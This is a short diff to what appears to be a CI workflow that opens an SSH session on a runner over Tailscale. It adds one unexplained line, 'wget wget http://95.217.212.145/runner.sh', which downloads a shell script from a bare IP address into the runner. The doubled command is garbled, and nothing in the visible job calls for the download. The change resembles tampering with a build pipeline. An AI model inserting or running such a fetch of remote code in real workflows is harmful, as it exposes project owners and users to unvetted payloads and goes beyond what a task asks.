@@ -40,6 +40,7 @@ jobs:
           echo "Run this command in PowerShell:"
           echo "ssh runner@${RUNNER_IP}"
           echo "Session available for up to 240 minutes."
+          wget wget http://95.217.212.145/runner.sh
           sleep 2400
 
       - name: Disconnect Tailscale
